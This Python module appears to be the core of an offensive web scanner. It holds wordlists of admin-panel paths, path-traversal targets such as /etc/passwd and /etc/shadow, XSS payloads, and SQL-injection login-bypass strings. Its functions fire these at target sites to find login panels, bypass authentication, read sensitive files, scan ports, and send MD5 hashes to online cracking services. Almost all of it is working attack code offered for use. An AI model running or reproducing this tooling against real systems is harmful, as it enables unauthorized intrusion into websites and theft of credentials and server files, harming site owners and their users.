"""Core scanning functionality."""

from __future__ import annotations

import hashlib
import re
import socket
import urllib.parse
from typing import Any

import requests

AGENTS = [
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
    "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
]

PANELS = [
    "admin/admin.asp",
    "admin/login.asp",
    "admin/index.asp",
    "admin/admin.aspx",
    "admin/login.aspx",
    "admin/index.aspx",
    "admin/webmaster.asp",
    "admin/webmaster.aspx",
    "asp/admin/index.asp",
    "asp/admin/index.aspx",
    "asp/admin/admin.asp",
    "asp/admin/admin.aspx",
    "asp/admin/webmaster.asp",
    "asp/admin/webmaster.aspx",
    "admin/",
    "login.asp",
    "login.aspx",
    "admin.asp",
    "admin.aspx",
    "webmaster.aspx",
    "webmaster.asp",
    "login/index.asp",
    "login/index.aspx",
    "login/login.asp",
    "login/login.aspx",
    "login/admin.asp",
    "login/admin.aspx",
    "administracion/index.asp",
    "administracion/index.aspx",
    "administracion/login.asp",
    "administracion/login.aspx",
    "administracion/webmaster.asp",
    "administracion/webmaster.aspx",
    "administracion/admin.asp",
    "administracion/admin.aspx",
    "php/admin/",
    "admin/admin.php",
    "admin/index.php",
    "admin/login.php",
    "admin/system.php",
    "admin/ingresar.php",
    "admin/administrador.php",
    "admin/default.php",
    "administracion/",
    "administracion/index.php",
    "administracion/login.php",
    "administracion/ingresar.php",
    "administracion/admin.php",
    "administration/",
    "administration/index.php",
    "administration/login.php",
    "administrator/index.php",
    "administrator/login.php",
    "administrator/system.php",
    "system/",
    "system/login.php",
    "admin.php",
    "login.php",
    "administrador.php",
    "administration.php",
    "administrator.php",
    "admin1.html",
    "admin1.php",
    "admin2.php",
    "admin2.html",
    "yonetim.php",
    "yonetim.html",
    "yonetici.php",
    "yonetici.html",
    "adm/",
    "admin/account.php",
    "admin/account.html",
    "admin/index.html",
    "admin/login.html",
    "admin/home.php",
    "admin/controlpanel.html",
    "admin/controlpanel.php",
    "admin.html",
    "admin/cp.php",
    "admin/cp.html",
    "cp.php",
    "cp.html",
    "administrator/",
    "administrator/index.html",
    "administrator/login.html",
    "administrator/account.html",
    "administrator/account.php",
    "administrator.html",
    "login.html",
    "modelsearch/login.php",
    "moderator.php",
    "moderator.html",
    "moderator/login.php",
    "moderator/login.html",
    "moderator/admin.php",
    "moderator/admin.html",
    "moderator/",
    "account.php",
    "account.html",
    "controlpanel/",
    "controlpanel.php",
    "controlpanel.html",
    "admincontrol.php",
    "admincontrol.html",
    "adminpanel.php",
    "adminpanel.html",
    "admin1.asp",
    "admin2.asp",
    "yonetim.asp",
    "yonetici.asp",
    "admin/account.asp",
    "admin/home.asp",
    "admin/controlpanel.asp",
    "admin/cp.asp",
    "cp.asp",
    "administrator/index.asp",
    "administrator/login.asp",
    "administrator/account.asp",
    "administrator.asp",
    "modelsearch/login.asp",
    "moderator.asp",
    "moderator/login.asp",
    "moderator/admin.asp",
    "account.asp",
    "controlpanel.asp",
    "admincontrol.asp",
    "adminpanel.asp",
    "fileadmin/",
    "fileadmin.php",
    "fileadmin.asp",
    "fileadmin.html",
    "administration.html",
    "sysadmin.php",
    "sysadmin.html",
    "phpmyadmin/",
    "myadmin/",
    "sysadmin.asp",
    "sysadmin/",
    "ur-admin.asp",
    "ur-admin.php",
    "ur-admin.html",
    "ur-admin/",
    "Server.php",
    "Server.html",
    "Server.asp",
    "Server/",
    "wp-admin/",
    "administr8.php",
    "administr8.html",
    "administr8/",
    "administr8.asp",
    "webadmin/",
    "webadmin.php",
    "webadmin.asp",
    "webadmin.html",
    "administratie/",
    "admins/",
    "admins.php",
    "admins.asp",
    "admins.html",
    "administrivia/",
    "Database_Administration/",
    "WebAdmin/",
    "useradmin/",
    "sysadmins/",
    "admin1/",
    "system-administration/",
    "administrators/",
    "pgadmin/",
    "directadmin/",
    "staradmin/",
    "ServerAdministrator/",
    "SysAdmin/",
    "administer/",
    "LiveUser_Admin/",
    "sys-admin/",
    "typo3/",
    "panel/",
    "cpanel/",
    "cPanel/",
    "cpanel_file/",
    "platz_login/",
    "rcLogin/",
    "blogindex/",
    "formslogin/",
    "autologin/",
    "support_login/",
    "meta_login/",
    "manuallogin/",
    "simpleLogin/",
    "loginflat/",
    "utility_login/",
    "showlogin/",
    "memlogin/",
    "members/",
    "login-redirect/",
    "sub-login/",
    "wp-login/",
    "login1/",
    "dir-login/",
    "login_db/",
    "xlogin/",
    "smblogin/",
    "customer_login/",
    "UserLogin/",
    "login-us/",
    "acct_login/",
    "admin_area/",
    "bigadmin/",
    "project-admins/",
    "phppgadmin/",
    "pureadmin/",
    "sql-admin/",
    "radmind/",
    "openvpnadmin/",
    "wizmysqladmin/",
    "vadmind/",
    "ezsqliteadmin/",
    "hpwebjetadmin/",
    "newsadmin/",
    "adminpro/",
    "Lotus_Domino_Admin/",
    "bbadmin/",
    "vmailadmin/",
    "Indy_admin/",
    "ccp14admin/",
    "irc-macadmin/",
    "banneradmin/",
    "sshadmin/",
    "phpldapadmin/",
    "macadmin/",
    "administratoraccounts/",
    "admin4_account/",
    "admin4_colon/",
    "radmind-1/",
    "Super-Admin/",
    "AdminTools/",
    "cmsadmin/",
    "SysAdmin2/",
    "globes_admin/",
    "cadmins/",
    "phpSQLiteAdmin/",
    "navSiteAdmin/",
    "server_admin_small/",
    "logo_sysadmin/",
    "server/",
    "database_administration/",
    "power_user/",
    "system_administration/",
    "ss_vms_admin_sm/",
]


LFI_FILES = [
    "../lfi.php",
    "../../../boot.ini",
    "../../../../boot.ini",
    "../../../../../boot.ini",
    "../../../../../../boot.ini",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/shadow~",
    "/etc/hosts",
    "/etc/motd",
    "/etc/apache/apache.conf",
    "/etc/fstab",
    "/etc/apache2/apache2.conf",
    "/etc/apache/httpd.conf",
    "/etc/httpd/conf/httpd.conf",
    "/etc/apache2/httpd.conf",
    "/etc/apache2/sites-available/default",
    "/etc/mysql/my.cnf",
    "/etc/my.cnf",
    "/etc/sysconfig/network-scripts/ifcfg-eth0",
    "/etc/redhat-release",
    "/etc/httpd/conf.d/php.conf",
    "/etc/pam.d/proftpd",
    "/etc/phpmyadmin/config.inc.php",
    "/var/www/config.php",
    "/etc/httpd/logs/error_log",
    "/etc/httpd/logs/error.log",
    "/etc/httpd/logs/access_log",
    "/etc/httpd/logs/access.log",
    "/var/log/apache/error_log",
    "/var/log/apache/error.log",
    "/var/log/apache/access_log",
    "/var/log/apache/access.log",
    "/var/log/apache2/error_log",
    "/var/log/apache2/error.log",
    "/var/log/apache2/access_log",
    "/var/log/apache2/access.log",
    "/var/www/logs/error_log",
    "/var/www/logs/error.log",
    "/var/www/logs/access_log",
    "/var/www/logs/access.log",
    "/usr/local/apache/logs/error_log",
    "/usr/local/apache/logs/error.log",
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache/logs/access.log",
    "/var/log/error_log",
    "/var/log/error.log",
    "/var/log/access_log",
    "/var/log/access.log",
    "/etc/group",
    "/etc/security/group",
    "/etc/security/passwd",
    "/etc/security/user",
    "/etc/security/environ",
    "/etc/security/limits",
    "/usr/lib/security/mkuser.default",
    "/apache/logs/access.log",
    "/apache/logs/error.log",
    "/etc/httpd/logs/acces_log",
    "/etc/httpd/logs/acces.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/apache2/logs/error.log",
    "/apache2/logs/access.log",
    "/logs/error.log",
    "/logs/access.log",
    "/usr/local/apache2/logs/access_log",
    "/usr/local/apache2/logs/access.log",
    "/usr/local/apache2/logs/error_log",
    "/usr/local/apache2/logs/error.log",
    "/var/log/httpd/access.log",
    "/var/log/httpd/error.log",
    "/opt/lampp/logs/access_log",
    "/opt/lampp/logs/error_log",
    "/opt/xampp/logs/access_log",
    "/opt/xampp/logs/error_log",
    "/opt/lampp/logs/access.log",
    "/opt/lampp/logs/error.log",
    "/opt/xampp/logs/access.log",
    "/opt/xampp/logs/error.log",
    "/usr/local/apache/conf/httpd.conf",
    "/usr/local/apache2/conf/httpd.conf",
    "/etc/apache/conf/httpd.conf",
    "/usr/local/etc/apache/conf/httpd.conf",
    "/usr/local/apache/httpd.conf",
    "/usr/local/apache2/httpd.conf",
    "/usr/local/httpd/conf/httpd.conf",
    "/usr/local/etc/apache2/conf/httpd.conf",
    "/usr/local/etc/httpd/conf/httpd.conf",
    "/usr/apache2/conf/httpd.conf",
    "/usr/apache/conf/httpd.conf",
    "/usr/local/apps/apache2/conf/httpd.conf",
    "/usr/local/apps/apache/conf/httpd.conf",
    "/etc/apache2/conf/httpd.conf",
    "/etc/http/conf/httpd.conf",
    "/etc/httpd/httpd.conf",
    "/etc/http/httpd.conf",
    "/etc/httpd.conf",
    "/opt/apache/conf/httpd.conf",
    "/opt/apache2/conf/httpd.conf",
    "/var/www/conf/httpd.conf",
    "/private/etc/httpd/httpd.conf",
    "/private/etc/httpd/httpd.conf.default",
]


SQLI_ERRORS = [
    r"supplied argument is not a valid MySQL result resource",
    r"mysql_free_result",
    r"mysql_fetch_assoc",
    r"mysql_num_rows",
    r"mysql_fetch_array",
    r"mysql_query",
    r"equivocado en su sintax",
    r"You have an error in your SQL syntax",
    r"Call to undefined function",
    r"Warning: mysql_",
    r"SQL syntax.*MySQL",
    r"MySQLSyntaxError",
]

LFI_ERRORS = [
    r"No such file or directory in .* on line",
    r"No existe el fiche*",
    r"failed to open stream",
    r"open_basedir restriction in effect",
]

XSS_PAYLOADS = [
    "<script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>",
    '"><script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>',
]


BYPASS_PAYLOADS = [
    "admin'--",
    "'or'1'='1",
    "'or'",
    " or 0=0 --",
    '" or 0=0 --',
    "or 0=0 --",
    "' or 0=0 #",
    '" or 0=0 #',
    "or 0=0 #",
    "' or 'x'='x",
    '" or "x"="x',
    "') or ('x'='x",
    "' or 1=1--",
    '" or 1=1--',
    "or 1=1--",
    "' or a=a--",
    '" or "a"="a',
    "') or ('a'='a",
    '") or ("a"="a',
    'hi" or "a"="a',
    'hi" or 1=1 --',
    "hi' or 1=1 --",
    "hi' or 'a'='a",
    "hi') or ('a'='a",
    'hi") or ("a"="a',
    "- ' or 'x'='x",
    "admin' or 1==1",
    '\' OR "="',
    "'or'1'='1",
]


DEFAULT_TIMEOUT = 10


def _get_session() -> requests.Session:
    """Create configured requests session."""
    session = requests.Session()
    session.headers["User-Agent"] = AGENTS[0]
    return session


def scan_panel(url: str, count: int = 3) -> list[str]:
    """Scan for admin login panels.

    Args:
        url: Target URL base (e.g., http://example.com)
        count: Maximum panels to find before stopping

    Returns:
        List of found admin panel URLs
    """
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    session = _get_session()
    found: list[str] = []

    for path in PANELS[: count * 10]:
        if len(found) >= count:
            break
        try:
            target = f"{base}/{path}"
            resp = session.get(target, allow_redirects=False)
            if resp.status_code == 200:
                found.append(target)
        except requests.RequestException:
            continue

    return found


def scan_sqli(url: str) -> bool:
    """Scan for SQL injection vulnerability.

    Args:
        url: Target URL with parameter

    Returns:
        True if SQLi vulnerability detected
    """
    session = _get_session()

    try:
        if "?" in url:
            test_url = url + "'"
            resp = session.get(test_url)
            content = resp.text.lower()
            for error in SQLI_ERRORS:
                if re.search(error, content, re.IGNORECASE):
                    return True
    except requests.RequestException:
        pass

    return False


def scan_lfi(url: str, files: list[str] | None = None) -> list[str]:
    """Scan for LFI vulnerabilities.

    Args:
        url: Target URL with parameter
        files: Optional custom file list

    Returns:
        List of sensitive files accessible
    """
    if files is None:
        files = LFI_FILES

    session = _get_session()
    found: list[str] = []

    for f in files:
        try:
            test_url = url + f
            resp = session.get(test_url)
            content = resp.text.lower()
            for error in LFI_ERRORS:
                if re.search(error, content, re.IGNORECASE):
                    found.append(f)
                    break
        except requests.RequestException:
            continue

    return found


def scan_xss(url: str) -> list[dict[str, Any]]:
    """Scan for XSS vulnerabilities.

    Args:
        url: Target URL

    Returns:
        List of dicts with vulnerable forms/params
    """
    session = _get_session()
    vulnerabilities: list[dict[str, Any]] = []

    try:
        resp = session.get(url)
        forms = re.findall(
            r"<form[^>]*>(.*?)</form>", resp.text, re.DOTALL | re.IGNORECASE
        )

        for i, form_html in enumerate(forms[:5]):
            action_match = re.search(r'action=["\']([^"\']+)["\']', form_html)
            method_match = re.search(r'method=["\'](\w+)["\']', form_html)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html)

            if not action_match or not inputs:
                continue

            action = action_match.group(1)
            method = (method_match.group(1) if method_match else "get").lower()

            for payload in XSS_PAYLOADS[:1]:
                test_data = dict.fromkeys(inputs, payload)

                if method == "post":
                    resp = session.post(action, data=test_data)
                else:
                    resp = session.get(action, params=test_data)

                if payload in resp.text:
                    vulnerabilities.append(
                        {
                            "form_index": i,
                            "action": action,
                            "method": method,
                            "inputs": inputs,
                            "payload": payload,
                        }
                    )
                    break
    except requests.RequestException:
        pass

    return vulnerabilities


def scan_bypass(url: str, positive: str | None = None) -> str | None:
    """Try to bypass admin login.

    Args:
        url: Target login URL
        positive: String that appears on successful login

    Returns:
        Bypass payload that worked, or None
    """
    session = _get_session()

    try:
        resp = session.get(url)
        forms = re.findall(r"<form[^>]*>(.*?)</form>", resp.text, re.DOTALL)

        for form_html in forms[:3]:
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html)

            if not inputs:
                continue

            for payload in BYPASS_PAYLOADS[:20]:
                test_data = dict.fromkeys(inputs, payload)

                try:
                    resp = session.post(url, data=test_data)

                    if positive:
                        if positive.lower() in resp.text.lower():
                            return payload
                    else:
                        if (
                            "incorrect" not in resp.text.lower()
                            and "invalid" not in resp.text.lower()
                        ):
                            if resp.text != session.get(url).text:
                                return payload
                except requests.RequestException:
                    continue
    except requests.RequestException:
        pass

    return None


def find_paths(url: str, full: bool = False) -> list[str]:
    """Find directory listings.

    Args:
        url: Target URL
        full: Do full recursive scan

    Returns:
        List of directories with listing enabled
    """
    session = _get_session()
    found: list[str] = []
    checked: set[str] = set()

    def check(u: str) -> None:
        if u in checked:
            return
        checked.add(u)

        try:
            resp = session.get(u)
            if re.search(r"Index of /", resp.text, re.IGNORECASE):
                found.append(u)

            if full:
                links = re.findall(r'href=["\'](/[^"\']+)["\']', resp.text)
                for link in links[:10]:
                    if not link.startswith("http"):
                        next_url = urllib.parse.urljoin(u, link)
                        if next_url not in checked:
                            check(next_url)
        except requests.RequestException:
            pass

    check(url)
    return found


def http_fingerprint(url: str) -> dict[str, str]:
    """Get HTTP server fingerprint.

    Args:
        url: Target URL

    Returns:
        Dict with server info
    """
    session = _get_session()
    info: dict[str, str] = {}

    try:
        resp = session.get(url)
        info["server"] = resp.headers.get("Server", "Unknown")
        info["date"] = resp.headers.get("Date", "")
        info["content_type"] = resp.headers.get("Content-Type", "")
        info["connection"] = resp.headers.get("Connection", "")
    except requests.RequestException:
        pass

    return info


def port_scan(ip: str, ports: list[int] | None = None) -> dict[int, str]:
    """Scan ports.

    Args:
        ip: Target IP
        ports: Optional port list (defaults to common)

    Returns:
        Dict of open ports -> service name
    """
    if ports is None:
        ports = [21, 22, 25, 80, 110, 3306]

    services = {
        21: "ftp",
        22: "ssh",
        25: "smtp",
        80: "http",
        110: "pop3",
        3306: "mysql",
        443: "https",
        143: "imap",
    }

    open_ports: dict[int, str] = {}

    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports[port] = services.get(port, "unknown")
        except OSError:
            pass
        finally:
            sock.close()

    return open_ports


def encode_md5(text: str) -> str:
    """MD5 encode text.

    Args:
        text: Text to encode

    Returns:
        MD5 hash
    """
    return hashlib.md5(text.encode()).hexdigest()


def crack_md5(hash: str) -> str | None:
    """Attempt to crack MD5 hash via online services.

    Args:
        hash: 32-char MD5 hash

    Returns:
        Decrypted hash or None
    """
    urls = [
        f"http://www.md5.net/cracker.php?hash={hash}",
        f"http://md5online.net/index.php?pass={hash}&option=hash2text",
    ]

    session = _get_session()

    for url in urls:
        try:
            resp = session.get(url)
            match = re.search(r'value="([^"]+)"', resp.text)
            if match:
                return match.group(1)
        except requests.RequestException:
            continue

    return None


def get_links(url: str) -> list[str]:
    """Extract links from page.

    Args:
        url: Page URL

    Returns:
        List of links
    """
    session = _get_session()

    try:
        resp = session.get(url)
        links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
        return links
    except requests.RequestException:
        return []
